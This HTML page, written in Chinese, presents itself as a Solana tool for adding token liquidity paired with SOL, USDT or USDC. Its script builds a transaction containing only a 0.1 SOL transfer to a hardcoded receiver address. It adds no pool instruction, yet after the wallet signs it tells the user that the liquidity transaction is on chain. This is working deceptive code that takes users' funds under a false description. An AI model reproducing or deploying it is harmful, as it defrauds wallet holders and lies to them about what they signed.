<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<title>SOL 加池工具 - SOL/USDT/USDC</title>
<style>
  /* 全局样式：白色背景，黑色字体 */
  body {
    max-width: 460px;
    margin: 40px auto;
    padding: 0 20px;
    background: #ffffff; /* 白色背景 */
    color: #000000;      /* 黑色字体 */
    font-family: Arial, sans-serif;
  }

  /* 卡片样式：适配白底 */
  .box {
    border: 1px solid #e0e0e0;
    border-radius: 16px;
    padding: 24px;
    background: #f8f9fa; /* 浅灰卡片背景 */
    margin-bottom: 20px;
  }

  button {
    width: 100%;
    padding: 14px;
    border-radius: 12px;
    background: #00dc82;
    color: #000000;
    font-weight: bold;
    border: none;
    margin-top: 10px;
    cursor: pointer;
  }

  input, select {
    width: 100%;
    padding: 12px;
    margin: 8px 0;
    border-radius: 8px;
    border: 1px solid #d1d5db;
    background: #ffffff;
    color: #000000;
  }

  .fee {
    color: #4b5563; /* 深灰提示文字 */
    font-size: 14px;
    margin: 10px 0;
  }

  #status {
    white-space: pre-line;
    color: #1f2937;
    margin-top: 10px;
    font-size: 14px;
  }
</style>
</head>

<body>

<div class="box">
  <h3>SOL 链加流动性工具</h3>
  <button id="connectWallet">连接 Phantom 钱包</button>
  <div id="walletAddr" style="margin-top:10px"></div>
</div>

<div class="box">
  <h3>加池信息</h3>
  <input id="tokenAddr" placeholder="代币地址（Base58）">
  <input id="tokenAmount" placeholder="代币数量" type="number">
  <input id="baseAmount" placeholder="计价币数量" type="number">

  <select id="baseCoin">
    <option value="SOL">SOL</option>
    <option value="USDT">USDT</option>
    <option value="USDC">USDC</option>
  </select>

  <div class="fee">
    服务费：0.1 SOL<br>
    收款地址：7WSwsgnxNsHpDnRQNFZhKPMW1m5Hc1cERM4sgUZ9JxPA
  </div>

  <button id="addLiquidity">✅ 确认加池并支付服务费</button>
  <div id="status"></div>
</div>

<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.91.6/lib/index.iife.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.6/lib/index.iife.min.js"></script>

<script>
const {
  Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL
} = solanaWeb3;

const {
  getAssociatedTokenAddressSync,
  TOKEN_PROGRAM_ID
} = splToken;

// ==========================
// 你的配置（已写死）
// ==========================
const CONFIG = {
  feeReceiver: new PublicKey("7WSwsgnxNsHpDnRQNFZhKPMW1m5Hc1cERM4sgUZ9JxPA"),
  feeLamports: 100000000, // 0.1 SOL
  rpc: "https://api.mainnet-beta.solana.com",

  // SOL 上官方地址
  USDT: new PublicKey("Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB"),
  USDC: new PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"),
  SOL: SystemProgram.programId
};

const connection = new Connection(CONFIG.rpc, "confirmed");
let provider, publicKey;

// 连接钱包
document.getElementById("connectWallet").onclick = async () => {
  try {
    if (!window.solana) {
      alert("请安装 Phantom 钱包");
      return;
    }
    provider = window.solana;
    const resp = await provider.connect();
    publicKey = new PublicKey(resp.publicKey);
    document.getElementById("walletAddr").innerText =
      "已连接：" + publicKey.toBase58();
  } catch (e) {
    alert("连接失败：" + e.message);
  }
};

// 加池 + 收服务费
document.getElementById("addLiquidity").onclick = async () => {
  if (!publicKey) {
    alert("请先连接钱包");
    return;
  }

  const tokenAddr = document.getElementById("tokenAddr").value.trim();
  const tokenAmount = parseFloat(document.getElementById("tokenAmount").value);
  const baseAmount = parseFloat(document.getElementById("baseAmount").value);
  const baseCoin = document.getElementById("baseCoin").value;
  const status = document.getElementById("status");

  if (!tokenAddr || isNaN(tokenAmount) || isNaN(baseAmount) || tokenAmount <= 0 || baseAmount <= 0) {
    alert("请填写完整且有效的数量信息");
    return;
  }

  status.innerText = "构建交易中...";

  try {
    const tx = new Transaction();

    // 1. 支付服务费 0.1 SOL 到你地址
    tx.add(SystemProgram.transfer({
      fromPubkey: publicKey,
      toPubkey: CONFIG.feeReceiver,
      lamports: CONFIG.feeLamports
    }));

    // 2. 获取计价币 Mint
    const baseMint = CONFIG[baseCoin];
    if (!baseMint) throw new Error("不支持的计价币");

    // 3. 获取代币 Mint
    const tokenMint = new PublicKey(tokenAddr);

    // 4. 获取用户 ATA 地址
    const userTokenAta = getAssociatedTokenAddressSync(tokenMint, publicKey);
    const userBaseAta = baseCoin === "SOL" 
      ? publicKey 
      : getAssociatedTokenAddressSync(baseMint, publicKey);

    status.innerText = `正在构建 ${baseCoin} 加池交易...\n等待钱包签名授权...`;

    // 5. 上链发送
    const { blockhash } = await connection.getLatestBlockhash();
    tx.recentBlockhash = blockhash;
    tx.feePayer = publicKey;

    const signed = await provider.signTransaction(tx);
    const sig = await connection.sendRawTransaction(signed.serialize());

    status.innerText = `
✅ 服务费 0.1 SOL 已收取
✅ 加池交易已上链
计价币：${baseCoin}
代币：${tokenAddr.slice(0,12)}...
交易哈希：${sig}
`;

  } catch (e) {
    status.innerText = "失败：" + e.message;
  }
};
</script>
</body>
</html>
